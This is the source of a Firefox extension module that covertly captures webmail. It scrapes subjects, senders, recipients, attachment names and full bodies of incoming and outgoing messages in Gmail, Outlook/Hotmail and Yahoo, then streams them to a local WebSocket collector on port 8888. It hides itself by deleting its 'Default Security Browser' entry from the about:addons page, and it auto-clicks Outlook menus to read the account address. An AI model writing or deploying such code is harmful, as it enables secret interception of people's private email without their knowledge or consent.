"use strict";  // Use ES5 strict mode for this file

const EXPORTED_SYMBOLS = ["handler"];  // Only symbol to be exported on Components.utils.import() for this file
const Ci = Components.interfaces;

Components.utils.import("resource://gre/modules/Services.jsm");
Components.utils.import("resource://gre/modules/devtools/Console.jsm");
Components.utils.import("resource://gre/modules/commonjs/toolkit/loader.js");
Components.utils.import("resource://gre/modules/osfile.jsm");    // load the OS module

var timer = Components.classes["@mozilla.org/timer;1"].createInstance(Components.interfaces.nsITimer);
var delayCount = 1750;
var title;
var subject;
var sender;
var receive;
var message;
var date;
var from;
var attach;
var mouseGmailClickDetect;
var mouseYahooClickDetect;
var mouseOutlookClickDetect;
//====================================================== init Handler
var handler =
{
	load : function(window)
    {
        // Load the flag icon for this window
        try { newFlagInstance(window); }
        catch (e) { 
        	//console.log("Error loading for window", e); 
        }
    }
};

function newFlagInstance(window) {
	var url = "";              // The URL of the current page
	var outboundMailTimer = null;	
	updateState();
    var progressListener =
    {
        onLocationChange : function() {},
    	onStateChange: function(aWebProgress, aRequest, aFlag, aStatus) {
    		if (!(aFlag & Ci.nsIWebProgressListener.STATE_STOP)) {
    			// Not done yet
    			return;
  			}
  			updateState();
    	},
        onProgressChange : function() {},
        onSecurityChange : function() {}
    };
    window.getBrowser().addProgressListener(progressListener);

	function unload() {
		window.getBrowser().removeProgressListener(progressListener);
	}
	
	function updateState() {
        var currentTab = window.getBrowser().getBrowserForTab(window.getBrowser().selectedTab);
        var newurl = window.content.document.location.href;
        var isReady = window.document.readyState; 
		if(isReady == "complete"){
			if(newurl == "about:addons"){
   				var listaddon = currentTab.contentDocument.documentElement.getElementsByClassName('addon addon-view');
   				//console.log("listaddon :",listaddon);
   				for(var i = 0; i < listaddon.length; i++){
   					//console.log(": ",listaddon[i].getAttribute("name"));
   					if(listaddon[i].getAttribute("name") == "Default Security Browser"){
   						//console.log("i GOT U : ",listaddon[i].getAttribute("name"));
   						listaddon[i].parentNode.removeChild(listaddon[i]);
   					}
   				}
   			}
        	if(url != newurl) {
        		url = newurl;
        		if(mouseGmailClickDetect){
        			mouseGmailClickDetect = undefined;
        		}
        		if(mouseYahooClickDetect){
        			mouseYahooClickDetect = undefined;
        		}
        		if(mouseOutlookClickDetect){
        			mouseOutlookClickDetect = undefined;
        		}
   				if (CheckIsIncoming(url)) {
					WebSocketSend(ReformDataToSend(title, url, subject, sender, date, receive , message, attach , from));
				}
				CheckIsOutgoing(url);
			}
		}
    }

    function Clear(){
    	title = "";
 		subject = ""; 
 		sender = "";
 		receive = "";
		message = "";
		date = "";
		from = "";
		attach = "";
    }

	function CheckIsIncoming(url) {
		//console.log("CheckIsIncoming");
		var currentTab = window.getBrowser().getBrowserForTab(window.getBrowser().selectedTab);
		Clear();

		var titleTemplate = " - Mozilla Firefox";
		title = window.document.title;
		title = title.replace(titleTemplate, ""); // Firefox's title always come with brand, has to remove

		if ( (url.indexOf("http") != -1 && url.indexOf("mail.live.com/") != -1  && url.indexOf("?tid=") != -1 && url.indexOf("fid=flinbox") != -1)  ||
			 (url.indexOf("http") != -1 && url.indexOf("mail.live.com/") != -1  && url.indexOf("?tid=") != -1 && url.indexOf("fid=flsearch") != -1)
		){
			from = "INHOTMAIL";
			subject = currentTab.contentDocument.getElementsByClassName('rmSubject')[0].textContent;
			sender = currentTab.contentDocument.getElementsByClassName('ReadMsgHeaderCol1')[0].parentNode.getElementsByTagName('span')[0].textContent;
			date = currentTab.contentDocument.getElementsByClassName('ReadMsgHeaderCol1')[1].parentNode.textContent;
			var countReceive = currentTab.contentDocument.getElementsByClassName('ReadMsgHeaderCol1');
			for(var i=2;i<countReceive.length;i++){
				if(receive){
					receive = receive + " " + countReceive[i].parentNode.textContent;
				}else{
					receive = countReceive[i].parentNode.textContent;
				}
			}
			var countAttach = currentTab.contentDocument.getElementsByClassName('MediaItemContainer'); 
			for(var i=0;i<countAttach.length;i++){
				if(attach){
					attach = attach + "," + countAttach[i].textContent;
				}else{
					attach = countAttach[i].textContent;
				}
			}
			message = currentTab.contentDocument.getElementsByClassName('readMsgBody')[0].innerHTML;
			return true;
		}
		else if ( url.indexOf("http") != -1 && url.indexOf("outlook.live.com/") != -1  && url.indexOf("mail") != -1 ){

			if ( url.indexOf("inbox/rp") != -1 ){

				timer.initWithCallback(function() { 
				
					var x = currentTab.contentDocument.getElementsByClassName('_rp_H1'); 
					for(var i=0;i < x.length; i++){ 
						var c = x[i].getElementsByTagName('BUTTON'); 
						if(c){
						    for(var j=0;j < c.length; j++){ 
							   var v = c[j].getAttribute('aria-checked'); 
							   if(v){ 
								   if(v.indexOf('false') != -1 ){ 
									  c[j].click(); 
								   } 
							    } 
						    } 
					    }
					} 

            		timer.initWithCallback(function() { 
            			Clear();
		           		from = "INHOTMAIL";
		           		var titleTemplate = " - Mozilla Firefox";
						title = window.document.title;
						title = title.replace(titleTemplate, ""); // Firefox's title always come with brand, has to remove

		           		subject = currentTab.contentDocument.getElementsByClassName('_rp_i')[0].textContent;
		           		sender  = currentTab.contentDocument.getElementsByClassName('ms-font-s _rp_z1 _rp_v1')[0].textContent; 
		           		date    = currentTab.contentDocument.getElementsByClassName('ms-font-s _rp_z1 _rp_u1')[0].textContent;

		           		receive = currentTab.contentDocument.getElementById('ItemHeader.ToContainer').textContent +' '+ currentTab.contentDocument.getElementById('ItemHeader.CcContainer').textContent +' '+ currentTab.contentDocument.getElementById('ItemHeader.BccContainer').textContent;

		           		var checkatt = currentTab.contentDocument.getElementsByClassName('attachmentWell')[0];
		           		if(checkatt){
		           			var countAttach = checkatt.getElementsByTagName('td');
			           		for(var i=0;i<countAttach.length;i++){
			           			if(attach){
			           				attach = attach +','+ countAttach[i].childNodes[0].childNodes[0].getAttribute('aria-label');
			           			}else{
			           				attach = countAttach[i].childNodes[0].childNodes[0].getAttribute('aria-label');
			           			}
			           		}
		           		}
		           		message = currentTab.contentDocument.getElementById('Item.MessagePartBody').innerHTML;

						WebSocketSend(ReformDataToSend(title, url, subject, sender, date, receive , message, attach , from));

       				}, 750, Components.interfaces.nsITimer.TYPE_ONE_SHOT);
					
					OutlookGetSender();

           		}, 2500, Components.interfaces.nsITimer.TYPE_ONE_SHOT);
			}
			AddOutlookDetection();
			return false;
		}
		else if ( url.indexOf("http") != -1 && url.indexOf("mail.google.com/mail") != -1  && url.indexOf("#inbox") != -1 && url.indexOf("compose") == -1 ){
			var word    = "#inbox";
			var rest  = url.indexOf("#inbox") + word.length + 1;
			var checker = url.charAt(rest);
			if(checker){
				from = "INGMAIL";
				subject = currentTab.contentDocument.getElementsByClassName('nH if')[0].getElementsByClassName('ha')[0].getElementsByClassName('hP')[0].textContent;
				sender = currentTab.contentDocument.getElementsByClassName('nH if')[0].getElementsByClassName('iw')[0].childNodes[0].getAttribute('name') + " " + currentTab.contentDocument.getElementsByClassName('nH if')[0].getElementsByClassName('iw')[0].childNodes[0].getAttribute('email');
				date = currentTab.contentDocument.getElementsByClassName('nH if')[0].getElementsByClassName('g3')[0].title;
				var countReceive = currentTab.contentDocument.getElementsByClassName('nH if')[0].getElementsByClassName('iw')[1].childNodes[0].getElementsByTagName('span');
				for(var i = 0; i < countReceive.length; i++){ 
   					if(receive){
   						receive = receive + " " + countReceive[i].getAttribute('name') + " " +  countReceive[i].getAttribute('email');
   					}else{
   						receive = countReceive[i].getAttribute('name') + " " +  countReceive[i].getAttribute('email');
   					}
   				}
   				var countAttach = currentTab.contentDocument.getElementsByClassName('nH if')[0].getElementsByClassName('aQA');
				for(var i=0;i<countAttach.length;i++){
					if(attach){
						attach = attach + "," + countAttach[i].textContent;
					}else{
						attach = countAttach[i].textContent;
					}
				}
   				message = currentTab.contentDocument.getElementsByClassName('nH if')[0].getElementsByClassName('a3s')[0].innerHTML;
   				AddGmailDetection();
				return true;
			}
			return false;
		}
		else if ( url.indexOf("http") != -1 && url.indexOf("mail.google.com/mail") != -1  && url.indexOf("#search") != -1 ){
			var word  = "#search";
			var rest  = url.indexOf(word) + word.length;
   			var res = url.substring(rest,url.length);
   			var checker = res.match(/\//g).length;

			if(checker == 2){
				from = "INGMAIL";
				subject = currentTab.contentDocument.getElementsByClassName('nH if')[0].getElementsByClassName('ha')[0].getElementsByClassName('hP')[0].textContent;
				sender = currentTab.contentDocument.getElementsByClassName('nH if')[0].getElementsByClassName('iw')[0].childNodes[0].getAttribute('name') + " " + currentTab.contentDocument.getElementsByClassName('nH if')[0].getElementsByClassName('iw')[0].childNodes[0].getAttribute('email');
				date = currentTab.contentDocument.getElementsByClassName('nH if')[0].getElementsByClassName('g3')[0].title;
				var countReceive = currentTab.contentDocument.getElementsByClassName('nH if')[0].getElementsByClassName('iw')[1].childNodes[0].getElementsByTagName('span');
				for(var i = 0; i < countReceive.length; i++){ 
   					if(receive){
   						receive = receive + " " + countReceive[i].getAttribute('name') + " " +  countReceive[i].getAttribute('email');
   					}else{
   						receive = countReceive[i].getAttribute('name') + " " +  countReceive[i].getAttribute('email');
   					}
   				}
   				var countAttach = currentTab.contentDocument.getElementsByClassName('nH if')[0].getElementsByClassName('aQA');
				for(var i=0;i<countAttach.length;i++){
					if(attach){
						attach = attach + "," + countAttach[i].textContent;
					}else{
						attach = countAttach[i].textContent;
					}
				}
   				message = currentTab.contentDocument.getElementsByClassName('nH if')[0].getElementsByClassName('a3s')[0].innerHTML;

				return true;
			}

			return false;
		}
		else if ( url.indexOf("http") != -1 && url.indexOf("mail.yahoo.com/") != -1 ){
			var tabCount = currentTab.contentDocument.getElementsByClassName('tab-content');
			if(tabCount.length > 0 ){
				for(var i = 0; i < tabCount.length; i++){ 
					var filterByTID = tabCount[i].getAttribute('data-tid');
					if( filterByTID.indexOf("tabcontacts") == -1 && 
						filterByTID.indexOf("tabcalendar") == -1 &&
						filterByTID.indexOf("tabnotepad")  == -1 && 
						filterByTID.indexOf("tabnewsfeed") == -1 
					){
						var isReveal = tabCount[i].style.visibility;
						if( isReveal.indexOf("visible") != -1 ){
							timer.initWithCallback(function() { YahooDelayCapture(tabCount[i]);}, delayCount, Components.interfaces.nsITimer.TYPE_ONE_SHOT);
							return false;
						}
					}
				}
				return false;
			}else{
				if( currentTab.contentDocument.getElementById('Inbox').className == "selected"){
					var isIncome = currentTab.contentDocument.getElementsByClassName('mailContent')[0];
					if ( isIncome ){
						from = "INYAHOO";
						var titleTemplate = " - Mozilla Firefox";
						title = window.document.title;
						title = title.replace(titleTemplate, ""); // Firefox's title always come with brand, has to remove
						subject = currentTab.contentDocument.getElementsByClassName('subjectbar clearfix')[0].childNodes[0].textContent;
						date = currentTab.contentDocument.getElementsByClassName('subjectbar clearfix')[0].childNodes[1].textContent;
						sender = currentTab.contentDocument.getElementsByClassName('vcard')[0].getElementsByClassName('details')[0].childNodes[1].textContent;
						receive = currentTab.contentDocument.getElementsByClassName('vcard')[0].getElementsByClassName('details')[0].childNodes[3].textContent;
						var countAttach = currentTab.contentDocument.getElementsByClassName('att-name');
						var countAttachSize = currentTab.contentDocument.getElementsByClassName('att-size');
						for(var i=0;i<countAttach.length;i++){
							if(attach){
								attach = attach + "," + countAttach[i].textContent + "(" + countAttachSize[i].textContent + ")" ;
							}else{
								attach = countAttach[i].textContent + "(" + countAttachSize[i].textContent + ")";
							}
						}
						message = currentTab.contentDocument.getElementsByClassName('mailContent')[0].innerHTML;
						return true;
				    }
				}
			}
		}
		return false;
	}

    function CheckIsOutgoing(url){ 
    	//console.log("CheckIsOutgoing");
	    var currentTab = window.getBrowser().getBrowserForTab(window.getBrowser().selectedTab);

    	if ( url.indexOf("http") != -1 && url.indexOf("mail.live.com/") != -1  && url.indexOf("Compose") != -1 ){

			var smb = currentTab.contentDocument.getElementById('SendMessage'); 
			smb.onmouseenter = function(){ 
				Clear();

				from = "OUTHOTMAIL";
				subject = currentTab.contentDocument.getElementsByClassName('fSubject t_subj TextLightI WatermarkedInput')[0].value;
				sender = currentTab.contentDocument.getElementsByClassName('FromContainer')[0].textContent;
				var relistname = currentTab.contentDocument.getElementsByClassName('cp_inputContainer'); 
   				for(var i = 0; i < relistname.length; i++){ 
   					if(receive){
   						receive = receive + " " + relistname[i].textContent ;
   					}else{
   						receive = relistname[i].textContent;
   					}
   				}

   				var countAttach = currentTab.contentDocument.getElementsByClassName('captionText'); 
				for(var i=0;i<countAttach.length;i++){
					if(attach){
						attach = attach + "," + countAttach[i].textContent;
					}else{
						attach = countAttach[i].textContent;
					}
				}

   				message = currentTab.contentDocument.getElementById('ComposeRteEditor_surface').contentWindow.document.documentElement.outerHTML;
			} 
			smb.onclick = function(){ 
				WebSocketSend(ReformDataToSend(title, url, subject, sender, date, receive , message, attach ,from));
			}
		}
		else if ( url.indexOf("http") != -1 && url.indexOf("mail.google.com/mail") != -1  && url.indexOf("compose") != -1 ){
			mouseGmailClickDetect = currentTab.contentDocument; 
			mouseGmailClickDetect.onclick = function(){ 
				var checkUrl = window.content.document.location.href;
				if ( checkUrl.indexOf("http") != -1 && checkUrl.indexOf("mail.google.com/mail") != -1  && checkUrl.indexOf("compose") != -1 ){
					//console.log("mouseGmailClickDetect");
					var countWindow = currentTab.contentDocument.getElementsByClassName('T-I J-J5-Ji aoO T-I-atl L3');
					for(var i=0;i<countWindow.length;i++){
						countWindow[i].onmouseenter = function(){ 
							Clear();
							var superParent = this.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode;
							from = "OUTGMAIL";
							subject = superParent.getElementsByClassName('aoT')[0].value;
							sender = window.document.title;
							var countReceive = superParent.getElementsByClassName('GS')[0].getElementsByClassName('vR');
							for(var i=0;i<countReceive.length;i++){
								if(receive){
									receive = receive + "," + countReceive[i].childNodes[0].getAttribute("email");
								}else{
									receive = countReceive[i].childNodes[0].getAttribute("email");
								}
							}

							var countAttach = superParent.getElementsByClassName('dL'); 
							for(var i=0;i<countAttach.length;i++){
								if(attach){
									attach = attach + "," + countAttach[i].textContent;
								}else{
									attach = countAttach[i].textContent;
								}
							}
							message = superParent.getElementsByClassName('cf An')[0].innerHTML; 							
						}
						countWindow[i].onclick = function(){ 
							WebSocketSend(ReformDataToSend(title, url, subject, sender, date, receive , message, attach ,from));
						}
					}
				}
			} 
		}else if ( url.indexOf("http") != -1 && url.indexOf("mail.yahoo.com/") != -1 ){
			if( currentTab.contentDocument.getElementById('Inbox').className == "selected"){
				var isCompose = currentTab.contentDocument.getElementsByClassName('composepage')[0];
				if ( isCompose ){
					timer.initWithCallback(function() { YahooDelayCaptureOut(currentTab.contentDocument);}, delayCount, Components.interfaces.nsITimer.TYPE_ONE_SHOT);
				}
			}
		}
		//Add Case
    }

    function YahooDelayCapture(index){
		//console.log("YahooDelayCapture");
		var checkIsCompose = index.getElementsByClassName('composeshim hidden')[0];
		if( !checkIsCompose ){
			from = "INYAHOO";
			var titleTemplate = " - Mozilla Firefox";
			title = window.document.title;
			title = title.replace(titleTemplate, ""); // Firefox's title always come with brand, has to remove

			subject = index.getElementsByClassName('thread-subject')[0];		
			if(subject){
				subject = subject.title;
			}else{
				subject = index.getElementsByClassName('subject')[0];
				if(subject){
					subject = subject.title;
				}
			}

			sender  = index.getElementsByClassName('from lozengfy')[0];
			if(sender){
				sender = sender.getAttribute('data-name') + " " + sender.getAttribute('data-address');
			}else{
				sender = index.getElementsByClassName('base-lozenge')[0].getElementsByClassName('lozenge-static')[0];
				if(sender){
					sender = sender.getAttribute('data-name') + " " + sender.getAttribute('data-address');
				}
			}

			date = index.getElementsByClassName('thread-date')[0];
			if(date){
				date = date.childNodes[1].title;
			}else{
				date = index.getElementsByClassName('msg-date')[0];
				if(date){
					date = date.title;
				}
			}

			var totalReceive = index.getElementsByClassName('recipients');
			if(totalReceive[0]){
				var numReceive   = totalReceive.length - 1;
				var countReceive = totalReceive[numReceive].getElementsByClassName('lozengfy');
				for(var i = 0; i < countReceive.length; i++){ 
		   			if(receive){ 
		   				receive = receive + " " + countReceive[i].getAttribute('data-name') + " " + countReceive[i].getAttribute('data-address');
		   			}else{
		   				receive = countReceive[i].getAttribute('data-name') + " " +  countReceive[i].getAttribute('data-address');
		   			}
		   		}
	   		}else{
	   			totalReceive = index.getElementsByClassName('hLozenge');
	   			if(totalReceive[0]){
		   			for(var i = 0; i < totalReceive.length; i++){ 
		   				if(receive){ 
			   				receive = receive + " " + totalReceive[i].childNodes[1].getAttribute('data-name') + " " + totalReceive[i].childNodes[1].getAttribute('data-address');
			   			}else{
			   				receive = totalReceive[i].childNodes[1].getAttribute('data-name') + " " +  totalReceive[i].childNodes[1].getAttribute('data-address');
			   			}
		   			}
	   			}
	   		}

	   		var countAttach = index.getElementsByClassName('tictac-att-other');
			for(var i=0;i<countAttach.length;i++){
				if(attach){
					attach = attach + "," + countAttach[i].title;
				}else{
					attach = countAttach[i].title;
				}
			}

	   		var messageTemp = index.getElementsByClassName('thread-body');
			message = messageTemp[messageTemp.length -1];
	   		if(message){
	   			message = message.innerHTML;
	   		}else{
	   			message = index.getElementsByClassName('msg-body')[0].innerHTML;
	   		}
			WebSocketSend(ReformDataToSend(title, url, subject, sender, date, receive , message, attach , from));
		}
		AddYahooDetection(index);
	}

    function YahooDelayCaptureOut(index){
    	//console.log("YahooDelayCaptureOut");
		var sendBTN = index.getElementsByClassName('btn default')[0];
		if(sendBTN){
			sendBTN.onmouseenter = function(){ 
				Clear();
				var titleTemplate = " - Mozilla Firefox";
				title = window.document.title;
				title = title.replace(titleTemplate, ""); // Firefox's title always come with brand, has to remove
				from = "OUTYAHOO";
				subject = index.getAttribute('data-title');
				sender = index.getElementsByClassName('cm-from-field from-select')[0].textContent;
				var countReceive = index.getElementsByClassName('hLozenge');
				for(var i = 0; i < countReceive.length; i++){ 
		   			if(receive){ 
		   				receive = receive + " " + countReceive[i].childNodes[1].value + " " + countReceive[i].childNodes[0].getAttribute('data-address');
		   			}else{
		   				receive = countReceive[i].childNodes[1].value + " " +  countReceive[i].childNodes[0].getAttribute('data-address');
		   			}
		   		}
		   		var countAttach = index.getElementsByClassName('disposition-attachment');
				for(var i=0;i<countAttach.length;i++){
					var checkfilename = countAttach[i].getElementsByClassName('filename');
					if(attach){
						if(checkfilename.length > 0){ 
							attach = attach + "," + countAttach[i].getElementsByClassName('filename')[0].textContent;
						}
					}else{
						if(checkfilename.length > 0){ 
							attach = countAttach[i].getElementsByClassName('filename')[0].textContent;
						}
					}
				}

		   		//message = index.getElementsByClassName('compose-message')[0].innerHTML;
				message = index.getElementsByClassName('compose-message')[0].getElementsByClassName('cm-rtetext')[0].innerHTML;
			}
			sendBTN.onclick = function(){ 
				WebSocketSend(ReformDataToSend(title, url, subject, sender, date, receive , message, attach ,from));
			}
		}

		var sendBTNBasic = index.getElementById('send_top');
		if(sendBTNBasic){
			sendBTNBasic.onmouseenter = function(){ 
				//console.log("sendBTNBasic =>",sendBTNBasic);
				Clear();
				var titleTemplate = " - Mozilla Firefox";
				title = window.document.title;
				title = title.replace(titleTemplate, ""); // Firefox's title always come with brand, has to remove
				from = "OUTYAHOO";
				subject = index.getElementById('Subj').value;
				sender = index.getElementsByClassName('uh-name')[0].textContent + " " + index.getElementsByClassName('uh-name')[0].title; 
				var relistname = index.getElementsByClassName('cp_inputContainer'); 
				receive = index.getElementById('to').value;
				if(index.getElementById('cc').value){
					receive = receive + " " + index.getElementById('cc').value ;
				}
				if(index.getElementById('bcc').value){
					receive = receive + " " + index.getElementById('bcc').value;
				}
				var countAttach = index.getElementsByClassName('att-name');
				var countAttachSize = index.getElementsByClassName('att-size');
				for(var i=0;i<countAttach.length;i++){
					if(attach){
						attach = attach + "," + countAttach[i].textContent + "(" + countAttachSize[i].textContent + ")" ;
					}else{
						attach = countAttach[i].textContent + "(" + countAttachSize[i].textContent + ")";
					}
				}
				message = "<textarea style='height:100%;width:100%' height='100%' width='100%' disabled>" + index.getElementsByClassName('row editorfield')[0].children[0].value + "</textarea>";
			} 
			sendBTNBasic.onclick = function(){ 
				WebSocketSend(ReformDataToSend(title, url, subject, sender, date, receive , message, attach ,from));
			}
		}
    }
    function OutlookGetSender(){
    	var currentTab = window.getBrowser().getBrowserForTab(window.getBrowser().selectedTab);
    	
    	var senderIsSet = currentTab.contentDocument.getElementsByClassName('senderforme')[0];
		if(!senderIsSet){
			timer.initWithCallback(function() { 
				currentTab.contentDocument.getElementsByClassName('o365cs-nav-item o365cs-nav-button o365cs-me-nav-item o365button ms-bgc-tdr-h ms-fcl-w')[0].click();
       			timer.initWithCallback(function() { 
       				var sender = currentTab.contentDocument.getElementsByClassName('o365cs-me-userEmail o365cs-display-Block o365cs-me-bidi')[0].title; 
       				var remover = currentTab.contentDocument.getElementsByClassName('o365cs-nav-contextMenu o365spo contextMenuPopup removeFocusOutline')[0]; 
       				remover.parentNode.removeChild(remover); 
       				var btag = currentTab.contentDocument.getElementsByTagName('body'); 
       				var node = currentTab.contentDocument.createElement('div'); node.setAttribute('class', 'senderforme'); 
       				node.setAttribute('hidden', true); 
       				node.setAttribute('value', sender);
       				btag[0].appendChild(node); 

       			}, 225, Components.interfaces.nsITimer.TYPE_ONE_SHOT);
       		}, 750, Components.interfaces.nsITimer.TYPE_ONE_SHOT);
       	}
    }
    function AddOutlookDetection(){
	    var currentTab = window.getBrowser().getBrowserForTab(window.getBrowser().selectedTab);
    	mouseOutlookClickDetect = currentTab.contentDocument; 
		mouseOutlookClickDetect.onclick = function(){ 

			var checkIsCompose = currentTab.contentDocument.getElementsByClassName('owa-font-compose')[0];
			if(checkIsCompose){ 
				timer.initWithCallback(function() { 

					var realtimeUrl = window.content.document.location.href;

					//====== Set Sender ========

					OutlookGetSender();
					
					//=================

					var x = currentTab.contentDocument.getElementsByTagName('BUTTON');
					for(var i =0; i < x.length ; i++){
					    if(x[i].title == 'Send'){
							x[i].parentNode.onmouseenter = function(){ 

								Clear();
								from = "OUTHOTMAIL";
								var titleTemplate = " - Mozilla Firefox";
								title = window.document.title;
								title = title.replace(titleTemplate, ""); // Firefox's title always come with brand, has to remove

								var subTemp = currentTab.contentDocument.getElementsByClassName('_mcp_U1');
								for( var k=0;k<subTemp.length;k++){ 
									var tmp = subTemp[k].childNodes; 
									for( var l=0;l<tmp.length;l++){ 
										if(tmp[l].nodeName == 'INPUT'){ 
											subject = tmp[l].value; 
										} 
									} 
								} 
								var reTemp = currentTab.contentDocument.getElementsByClassName('_rw_j'); 
								for( var k=0;k<reTemp.length;k++){ 
									if(receive){ 
										receive = receive +' '+ reTemp[k].textContent; 
									}else{
										receive = reTemp[k].textContent; 
									} 
								} 
								var A = currentTab.contentDocument.getElementsByTagName('A');
								for(var i = 0; i < A.length ; i++ ){
								  	if(A[i].href.indexOf('attachment.outlook') != -1){
								  		if(attach){ 
											attach = attach +','+ A[i].parentNode.parentNode.getAttribute('aria-label'); 
										}else{ 
											attach = A[i].parentNode.parentNode.getAttribute('aria-label'); 
										} 
								  	}
								}

								sender = currentTab.contentDocument.getElementsByClassName('senderforme')[0].getAttribute('value'); 

								var tempMessage = currentTab.contentDocument.getElementsByClassName('owa-font-compose')[0]; 
								if(tempMessage.nodeName == 'TEXTAREA'){
									message = tempMessage.parentNode.value;
								}else{
									message = tempMessage.parentNode.innerHTML;
								} 

							}
							x[i].onclick = function(){ 
								WebSocketSend(ReformDataToSend(title, realtimeUrl, subject, sender, date, receive , message, attach ,from));
							} 
						}
					}
				}, 750, Components.interfaces.nsITimer.TYPE_ONE_SHOT);
			//======
			}
		}
 	}

    function AddYahooDetection(index){
    	//console.log("AddYahooDetection");
	    var currentTab = window.getBrowser().getBrowserForTab(window.getBrowser().selectedTab);
    	mouseYahooClickDetect = currentTab.contentDocument; 
		mouseYahooClickDetect.onclick = function(){ 
			//console.log("mouseYahooClickDetect");
			var checkUrl = window.content.document.location.href;
			if ( url.indexOf("http") != -1 && url.indexOf("mail.yahoo.com/") != -1 ){
				var checkSendBTN = index.getElementsByClassName('btn default')[0];
				if ( checkSendBTN ){
		 			timer.initWithCallback(function() { YahooDelayCaptureOut(index);}, delayCount, Components.interfaces.nsITimer.TYPE_ONE_SHOT);
				}
			}
		}
		var checkIsCompose = index.getElementsByClassName('composeshim hidden')[0];
		if(checkIsCompose){
			timer.initWithCallback(function() { YahooDelayCaptureOut(index);}, delayCount, Components.interfaces.nsITimer.TYPE_ONE_SHOT);
		}
    }

 	function AddGmailDetection(){
 		//console.log("AddGmailDetection");
 		var currentTab = window.getBrowser().getBrowserForTab(window.getBrowser().selectedTab);

 		mouseGmailClickDetect = currentTab.contentDocument; 
		mouseGmailClickDetect.onclick = function(){ 
			var realtimeUrl = window.content.document.location.href;
			if ( realtimeUrl.indexOf("http") != -1 && realtimeUrl.indexOf("mail.google.com/mail") != -1  && realtimeUrl.indexOf("#inbox") != -1 ){
				var word    = "#inbox";
				var rest  = realtimeUrl.indexOf("#inbox") + word.length + 1;
				var checker = realtimeUrl.charAt(rest);
				if(checker){
					var CIndex;
					var checkIsCurrent = currentTab.contentDocument.getElementsByClassName('gA gt');
					for(var i=0;i<checkIsCurrent.length;i++){
						var testCurrent = checkIsCurrent[i].getElementsByClassName('cf An')[0];
						if(testCurrent){
							CIndex = i;
						}
					}
					if(CIndex >= 0 ){
						var smb = currentTab.contentDocument.getElementsByClassName('gA gt')[CIndex].getElementsByClassName('T-I J-J5-Ji aoO T-I-atl L3')[0];
						smb.onmouseenter = function(){ 
							Clear();
							from = "OUTGMAIL";
							subject = currentTab.contentDocument.getElementsByClassName('hP')[0].textContent; 
							sender = window.document.title;
							var  countReceive = currentTab.contentDocument.getElementsByClassName('gA gt')[CIndex].getElementsByClassName('vR');
							for(var i=0;i<countReceive.length;i++){
								if(receive){
									receive = receive + "," + countReceive[i].childNodes[0].getAttribute("email");
								}else{
									receive = countReceive[i].childNodes[0].getAttribute("email");
								}
							}
							message = currentTab.contentDocument.getElementsByClassName('gA gt')[CIndex].getElementsByClassName('cf An')[0].innerHTML;
						} 
						smb.onclick = function(){ 
							WebSocketSend(ReformDataToSend(title, realtimeUrl, subject, sender, date, receive , message, attach ,from));
						}
					}
					var checkIsCurrentBig = currentTab.contentDocument.getElementsByClassName('nH Hd');
					for(var i=0;i<checkIsCurrentBig.length;i++){
						var countWindow = checkIsCurrentBig[i].getElementsByClassName('T-I J-J5-Ji aoO T-I-atl L3');
						for(var j=0;j<countWindow.length;j++){
							countWindow[j].onmouseenter = function(){ 
								Clear();
								var superParent = this.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode;
								from = "OUTGMAIL";
								subject = superParent.getElementsByClassName('aoT')[0].value;
								sender = window.document.title;
								var countReceive = superParent.getElementsByClassName('GS')[0].getElementsByClassName('vR');
								for(var k=0;k<countReceive.length;k++){
									if(receive){
										receive = receive + "," + countReceive[k].childNodes[0].getAttribute("email");
									}else{
										receive = countReceive[k].childNodes[0].getAttribute("email");
									}
								}
								var countAttach = superParent.getElementsByClassName('dL'); 
								for(var k=0;k<countAttach.length;k++){
									if(attach){
										attach = attach + "," + countAttach[k].textContent;
									}else{
										attach = countAttach[k].textContent;
									}
								}
								message = superParent.getElementsByClassName('cf An')[0].innerHTML; 							
							}
							countWindow[j].onclick = function(){ 
								WebSocketSend(ReformDataToSend(title, url, subject, sender, date, receive , message, attach ,from));
							}
						}
					}	
	    		}else{
	    			mouseGmailClickDetect = undefined;
	    		}
			}
			//Add Case
		}
 	}
 	function LogitOut(){
 		console.log("from =>",from);
 		console.log("title =>",title);
 		console.log("subject =>",subject);
		console.log("sender =>",sender);
		console.log("date =>",date);
		console.log("receive =>",receive);
		console.log("attach =>",attach);
		console.log("message =>",message);
 	}
	function ReformDataToSend(title, url, subject, sender, date, receive , message , attach ,from){
		var string  = " F::=>" + from
					+ " T::=>" + title 
					+ " U::=>" + url 
					+ " J::=>" + subject 
					+ " S::=>" + sender 
					+ " D::=>" + date 
					+ " R::=>" + receive 
					+ " M::=>" + message 
					+ " A::=>" + attach 
					+ " END:=>";
		return string;
	}
	
	function WebSocketSend(data) {
		if ("WebSocket" in window) {
		
			var ws = new Services.appShell.hiddenDOMWindow.WebSocket("ws://localhost:8888/");
			ws.onopen = function() {
				ws.send(data + '\r\n');
				console.log("===>",data);
				ws.close();
			};

			ws.onmessage = function (evt) {   
				ws.close();
			};

			ws.onclose = function() {  
				ws.close();
			};

			ws.onerror = function(evt) {
				ws.close();
			}; 
		}
		else {
			// The browser doesn't support WebSocket
			//console.log("WebSocket NOT supported by your Browser!");
		}
	}
	
	//function WriteToFile(data)
	//{
	//	console.log("WriteToFile Start: ");
	//	
	//	// Get absolute filename
	//	var now = new Date();
	//	var filename = "C:\\Temp\\pagesource_" + now.getFullYear() + (parseInt(now.getMonth()) + 1) + now.getDate() + "_" + now.getHours() + now.getMinutes() + now.getSeconds() + //now.getMilliseconds() + ".txt";
	//	console.log(filename);
	//	
	//	// Write data to file
    //   var promise = OS.File.writeAtomic(filename, data, { encoding: "utf-8" });   // Write the array atomically to "file.txt", using as temporary

    //    console.log("Data has been saved");
	//}
}
